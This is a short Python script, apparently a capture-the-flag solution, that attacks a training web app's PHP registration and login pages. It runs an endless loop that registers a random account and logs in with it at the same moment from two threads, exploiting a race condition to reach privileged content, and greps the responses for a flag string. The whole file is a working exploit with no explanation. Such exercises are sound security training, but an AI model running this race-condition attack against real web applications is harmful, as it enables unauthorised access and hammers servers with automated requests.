import requests
import random
import string
import threading
import re

url = "http://meta.training.jinblack.it"

def find_flag(data):
	search = re.search("flag{[a-zA-Z1-9_!]+}", data)
	if search:
		print(search.group())

def gen_rand_string():
	return "".join(random.choice(string.ascii_letters+string.digits) for _ in range(5))

def register(s, u, p):
	data = {"username": u, "password_1": p, "password_2": p, "reg_user": ""}
	s.post(url+"/register.php", data=data)

def login(s, u, p):
	data = {"username": u, "password": p, "log_user": ""}
	s.post(url+"/login.php", data=data).text
	home(s)

def logout(s):
	s.get(url+"/logout.php")	

def home(s):
	find_flag(s.get(url+"/index.php").text)

def download_user(s):
	print(s.get(url+"/download_user.php").text)

while(True):
	s = requests.Session()
	u = gen_rand_string()
	p = gen_rand_string()
	t1 = threading.Thread(target=register, args=(s, u, p))
	t2 = threading.Thread(target=login, args=(s, u, p))
	t1.start()
	t2.start()
	t1.join()
	t2.join()
	logout(s)
